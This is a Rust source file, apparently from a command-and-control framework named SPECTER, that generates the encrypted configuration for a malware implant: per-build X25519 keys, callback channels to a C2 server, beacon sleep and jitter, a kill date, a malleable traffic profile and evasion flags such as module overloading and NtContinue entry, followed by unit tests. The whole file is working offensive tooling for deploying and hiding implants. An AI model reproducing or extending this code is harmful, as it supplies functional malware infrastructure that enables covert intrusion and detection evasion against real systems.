use chacha20poly1305::aead::{Aead, KeyInit};
use chacha20poly1305::{ChaCha20Poly1305, Nonce};
use rand::RngCore;
use sha2::{Digest, Sha256};
use x25519_dalek::{PublicKey, StaticSecret};

use crate::profile::compile_profile;
use crate::profile::schema::Profile;

use super::BuilderError;

/// Sleep configuration embedded in the implant.
#[derive(Debug, Clone)]
pub struct SleepConfig {
    /// Base sleep interval in seconds.
    pub interval_secs: u64,
    /// Jitter percentage (0–100).
    pub jitter_percent: u8,
}

impl Default for SleepConfig {
    fn default() -> Self {
        Self {
            interval_secs: 60,
            jitter_percent: 10,
        }
    }
}

/// Channel endpoint for implant communication.
#[derive(Debug, Clone)]
pub struct ChannelConfig {
    /// Channel type (e.g., "http", "https", "dns").
    pub kind: String,
    /// Primary callback address (e.g., "https://c2.example.com/api/checkin").
    pub address: String,
}

/// Result of implant config generation.
#[derive(Debug, Clone)]
pub struct GeneratedConfig {
    /// Encrypted, serialized config blob ready for embedding.
    pub config_blob: Vec<u8>,
    /// X25519 public key generated for this implant build.
    pub implant_pubkey: [u8; 32],
}

// ── TLV field IDs for implant config ─────────────────────────────────────────

mod config_field {
    pub const SERVER_PUBKEY: u8 = 0x80;
    pub const IMPLANT_PRIVKEY_ENCRYPTED: u8 = 0x81;
    pub const CHANNEL_KIND: u8 = 0x82;
    pub const CHANNEL_ADDRESS: u8 = 0x83;
    pub const SLEEP_INTERVAL: u8 = 0x84;
    pub const SLEEP_JITTER: u8 = 0x85;
    pub const KILL_DATE: u8 = 0x86;
    pub const PROFILE_BLOB: u8 = 0x87;
    pub const EVASION_FLAGS: u8 = 0x88;
    pub const IMPLANT_PUBKEY: u8 = 0x89;
}

/// Generate a complete implant config blob.
///
/// Steps:
/// 1. Generate fresh X25519 keypair for this implant build.
/// 2. Compile the malleable profile to TLV.
/// 3. Serialize all config fields (server pubkey, channels, sleep, kill date, profile).
/// 4. Derive a per-build encryption key from implant+server shared secret.
/// 5. Encrypt the serialized config with ChaCha20-Poly1305.
/// 6. Return encrypted blob + implant public key.
/// Evasion feature flags (bitfield serialized into config TLV).
#[derive(Debug, Clone, Copy, Default)]
pub struct EvasionFlags {
    pub module_overloading: bool,
    pub pdata_registration: bool,
    pub ntcontinue_entry: bool,
}

impl EvasionFlags {
    /// Pack into a single byte bitfield for TLV serialization.
    pub fn to_byte(&self) -> u8 {
        let mut flags = 0u8;
        if self.module_overloading {
            flags |= 0x01;
        }
        if self.pdata_registration {
            flags |= 0x02;
        }
        if self.ntcontinue_entry {
            flags |= 0x04;
        }
        flags
    }
}

pub fn generate_config(
    profile: &Profile,
    server_pubkey: &PublicKey,
    channels: &[ChannelConfig],
    sleep_config: &SleepConfig,
    kill_date: Option<i64>,
) -> Result<GeneratedConfig, BuilderError> {
    generate_config_with_evasion(
        profile,
        server_pubkey,
        channels,
        sleep_config,
        kill_date,
        EvasionFlags::default(),
        &[],
    )
}

pub fn generate_config_with_evasion(
    profile: &Profile,
    server_pubkey: &PublicKey,
    channels: &[ChannelConfig],
    sleep_config: &SleepConfig,
    kill_date: Option<i64>,
    evasion: EvasionFlags,
    pic_blob: &[u8],
) -> Result<GeneratedConfig, BuilderError> {
    if channels.is_empty() {
        return Err(BuilderError::Config(
            "at least one channel is required".into(),
        ));
    }

    // 1. Generate implant X25519 keypair
    let implant_secret = StaticSecret::random_from_rng(rand::thread_rng());
    let implant_pubkey = PublicKey::from(&implant_secret);

    // 2. Compile profile to TLV
    let profile_blob = compile_profile(profile)
        .map_err(|e| BuilderError::Config(format!("profile compilation failed: {e}")))?;

    // 3. Serialize config fields as TLV
    let mut plaintext = Vec::with_capacity(4096);

    // Server public key
    tlv_bytes(
        &mut plaintext,
        config_field::SERVER_PUBKEY,
        server_pubkey.as_bytes(),
    );

    // Implant private key (will be encrypted along with everything else)
    tlv_bytes(
        &mut plaintext,
        config_field::IMPLANT_PRIVKEY_ENCRYPTED,
        implant_secret.as_bytes(),
    );

    // Implant public key (implant needs this for checkin identification)
    tlv_bytes(
        &mut plaintext,
        config_field::IMPLANT_PUBKEY,
        implant_pubkey.as_bytes(),
    );

    // Channels
    for ch in channels {
        tlv_string(&mut plaintext, config_field::CHANNEL_KIND, &ch.kind);
        tlv_string(&mut plaintext, config_field::CHANNEL_ADDRESS, &ch.address);
    }

    // Sleep config
    tlv_u64(
        &mut plaintext,
        config_field::SLEEP_INTERVAL,
        sleep_config.interval_secs,
    );
    tlv_bytes(
        &mut plaintext,
        config_field::SLEEP_JITTER,
        &[sleep_config.jitter_percent],
    );

    // Kill date (Unix timestamp, 0 = no kill date)
    if let Some(kd) = kill_date {
        tlv_u64(&mut plaintext, config_field::KILL_DATE, kd as u64);
    }

    // Compiled profile blob
    tlv_bytes(&mut plaintext, config_field::PROFILE_BLOB, &profile_blob);

    // Evasion flags (single byte bitfield)
    let evasion_byte = evasion.to_byte();
    if evasion_byte != 0 {
        tlv_bytes(&mut plaintext, config_field::EVASION_FLAGS, &[evasion_byte]);
    }

    // 4. Derive encryption key.
    // The implant derives its key from SHA256(first 64 bytes of PIC blob).
    // If we have the PIC blob, use the same derivation so the implant can decrypt.
    // Otherwise fall back to ECDH shared secret (for stagers / tests).
    let encryption_key = if pic_blob.len() >= 64 {
        derive_pic_key(pic_blob)
    } else {
        let shared_secret = implant_secret.diffie_hellman(server_pubkey);
        derive_config_key(shared_secret.as_bytes())
    };

    // 5. Encrypt with ChaCha20-Poly1305
    let cipher = ChaCha20Poly1305::new_from_slice(&encryption_key)
        .map_err(|e| BuilderError::Config(format!("cipher init failed: {e}")))?;
    let mut nonce_bytes = [0u8; 12];
    rand::thread_rng().fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    // AAD = magic + version (first 8 bytes of CONFIG_BLOB_HEADER).
    // The implant passes these as additional authenticated data during decryption.
    let mut aad = [0u8; 8];
    aad[..4].copy_from_slice(&0x53504543u32.to_le_bytes()); // CONFIG_MAGIC
    aad[4..8].copy_from_slice(&1u32.to_le_bytes());          // CONFIG_VERSION

    use chacha20poly1305::aead::Payload;
    let ciphertext_with_tag = cipher
        .encrypt(nonce, Payload { msg: &plaintext, aad: &aad })
        .map_err(|e| BuilderError::Config(format!("config encryption failed: {e}")))?;

    // ChaCha20-Poly1305 appends 16-byte tag to ciphertext.
    // Split into ciphertext and tag for the CONFIG_BLOB_HEADER format.
    let tag_offset = ciphertext_with_tag.len() - 16;
    let ciphertext = &ciphertext_with_tag[..tag_offset];
    let tag = &ciphertext_with_tag[tag_offset..];

    // 6. Pack as CONFIG_BLOB_HEADER + encrypted data:
    // [magic: u32 LE][version: u32 LE][data_size: u32 LE][nonce: 12][tag: 16][ciphertext]
    let data_size = ciphertext.len() as u32;
    let mut config_blob = Vec::with_capacity(4 + 4 + 4 + 12 + 16 + ciphertext.len());
    config_blob.extend_from_slice(&0x53504543u32.to_le_bytes()); // CONFIG_MAGIC "SPEC"
    config_blob.extend_from_slice(&1u32.to_le_bytes()); // CONFIG_VERSION
    config_blob.extend_from_slice(&data_size.to_le_bytes()); // data_size
    config_blob.extend_from_slice(&nonce_bytes); // nonce (12 bytes)
    config_blob.extend_from_slice(tag); // AEAD tag (16 bytes)
    config_blob.extend_from_slice(ciphertext); // encrypted TLV data

    Ok(GeneratedConfig {
        config_blob,
        implant_pubkey: *implant_pubkey.as_bytes(),
    })
}

/// Derive a 32-byte encryption key from the DH shared secret using SHA-256 with a domain tag.
/// Used as fallback when PIC blob is not available (stagers, tests).
fn derive_config_key(shared_secret: &[u8]) -> [u8; 32] {
    let mut hasher = Sha256::new();
    hasher.update(b"SPECTER_CONFIG_KEY_V1");
    hasher.update(shared_secret);
    hasher.finalize().into()
}

/// Derive a 32-byte encryption key from the PIC blob, matching the implant's
/// `cfg_derive_key()` in `config.c`: `SHA256(pic_base[0..64])`.
fn derive_pic_key(pic_blob: &[u8]) -> [u8; 32] {
    let input_len = pic_blob.len().min(64);
    let mut hasher = Sha256::new();
    hasher.update(&pic_blob[..input_len]);
    hasher.finalize().into()
}

// ── TLV helpers (same format as profile compiler) ────────────────────────────

fn tlv_bytes(buf: &mut Vec<u8>, field_id: u8, data: &[u8]) {
    buf.push(field_id);
    let len = data.len() as u16;
    buf.extend_from_slice(&len.to_le_bytes());
    buf.extend_from_slice(data);
}

fn tlv_string(buf: &mut Vec<u8>, field_id: u8, s: &str) {
    tlv_bytes(buf, field_id, s.as_bytes());
}

fn tlv_u64(buf: &mut Vec<u8>, field_id: u8, val: u64) {
    tlv_bytes(buf, field_id, &val.to_le_bytes());
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profile::parse_profile;

    fn test_profile() -> Profile {
        parse_profile(
            r#"
name: test-builder
description: test
tls:
  cipher_suites: ["TLS_AES_128_GCM_SHA256"]
http:
  request:
    method: POST
    uri_patterns: ["/api/checkin"]
  response:
    status_code: 200
timing:
  callback_interval: 30
transform:
  compress: lz4
  encrypt: chacha20-poly1305
  encode: base64
"#,
        )
        .unwrap()
    }

    fn test_server_keypair() -> (StaticSecret, PublicKey) {
        let secret = StaticSecret::random_from_rng(rand::thread_rng());
        let pubkey = PublicKey::from(&secret);
        (secret, pubkey)
    }

    #[test]
    fn test_generate_config_produces_blob() {
        let profile = test_profile();
        let (_secret, pubkey) = test_server_keypair();
        let channels = vec![ChannelConfig {
            kind: "https".into(),
            address: "https://c2.example.com/api/checkin".into(),
        }];

        let result = generate_config(&profile, &pubkey, &channels, &SleepConfig::default(), None)
            .expect("config generation should succeed");

        // Config blob should be non-empty (12 byte nonce + ciphertext)
        assert!(result.config_blob.len() > 12);
        // Implant pubkey should be 32 bytes and non-zero
        assert_ne!(result.implant_pubkey, [0u8; 32]);
    }

    #[test]
    fn test_generate_config_decryptable() {
        let profile = test_profile();
        let (server_secret, server_pubkey) = test_server_keypair();
        let channels = vec![ChannelConfig {
            kind: "http".into(),
            address: "http://10.0.0.1:8080/api/checkin".into(),
        }];

        let result = generate_config(
            &profile,
            &server_pubkey,
            &channels,
            &SleepConfig {
                interval_secs: 30,
                jitter_percent: 25,
            },
            Some(1735689600), // 2025-01-01
        )
        .expect("config generation should succeed");

        // Parse CONFIG_BLOB_HEADER
        let blob = &result.config_blob;
        let magic = u32::from_le_bytes([blob[0], blob[1], blob[2], blob[3]]);
        assert_eq!(magic, 0x53504543, "CONFIG_MAGIC should be 'SPEC'");
        let version = u32::from_le_bytes([blob[4], blob[5], blob[6], blob[7]]);
        assert_eq!(version, 1);
        let data_size = u32::from_le_bytes([blob[8], blob[9], blob[10], blob[11]]) as usize;
        let nonce_bytes = &blob[12..24];
        let tag = &blob[24..40];
        let ciphertext = &blob[40..40 + data_size];

        // Derive key via ECDH (no PIC blob provided → fallback path)
        let implant_pubkey = PublicKey::from(result.implant_pubkey);
        let shared_secret = server_secret.diffie_hellman(&implant_pubkey);
        let key = derive_config_key(shared_secret.as_bytes());

        // Reconstruct ciphertext+tag for decryption (ChaCha20-Poly1305 expects appended tag)
        let mut ct_with_tag = Vec::with_capacity(data_size + 16);
        ct_with_tag.extend_from_slice(ciphertext);
        ct_with_tag.extend_from_slice(tag);

        // Decrypt with AAD = magic + version (first 8 bytes of header)
        let nonce = Nonce::from_slice(nonce_bytes);
        let cipher = ChaCha20Poly1305::new_from_slice(&key).unwrap();
        use chacha20poly1305::aead::Payload;
        let aad = &blob[0..8]; // magic + version
        let plaintext = cipher
            .decrypt(nonce, Payload { msg: ct_with_tag.as_slice(), aad })
            .expect("decryption should succeed");

        // Verify TLV structure: walk entries
        let mut pos = 0;
        let mut fields_seen = Vec::new();
        while pos < plaintext.len() {
            assert!(pos + 3 <= plaintext.len(), "truncated TLV");
            let fid = plaintext[pos];
            let len = u16::from_le_bytes([plaintext[pos + 1], plaintext[pos + 2]]) as usize;
            pos += 3 + len;
            fields_seen.push(fid);
        }
        assert_eq!(pos, plaintext.len(), "trailing bytes");

        // Check expected fields present
        assert!(fields_seen.contains(&config_field::SERVER_PUBKEY));
        assert!(fields_seen.contains(&config_field::IMPLANT_PRIVKEY_ENCRYPTED));
        assert!(fields_seen.contains(&config_field::CHANNEL_KIND));
        assert!(fields_seen.contains(&config_field::CHANNEL_ADDRESS));
        assert!(fields_seen.contains(&config_field::SLEEP_INTERVAL));
        assert!(fields_seen.contains(&config_field::SLEEP_JITTER));
        assert!(fields_seen.contains(&config_field::KILL_DATE));
        assert!(fields_seen.contains(&config_field::PROFILE_BLOB));
    }

    #[test]
    fn test_generate_config_unique_per_build() {
        let profile = test_profile();
        let (_secret, pubkey) = test_server_keypair();
        let channels = vec![ChannelConfig {
            kind: "https".into(),
            address: "https://c2.example.com/api/checkin".into(),
        }];

        let r1 =
            generate_config(&profile, &pubkey, &channels, &SleepConfig::default(), None).unwrap();
        let r2 =
            generate_config(&profile, &pubkey, &channels, &SleepConfig::default(), None).unwrap();

        // Different keypairs → different blobs
        assert_ne!(r1.implant_pubkey, r2.implant_pubkey);
        assert_ne!(r1.config_blob, r2.config_blob);
    }

    #[test]
    fn test_generate_config_requires_channel() {
        let profile = test_profile();
        let (_secret, pubkey) = test_server_keypair();

        let result = generate_config(&profile, &pubkey, &[], &SleepConfig::default(), None);
        assert!(result.is_err());
    }
}
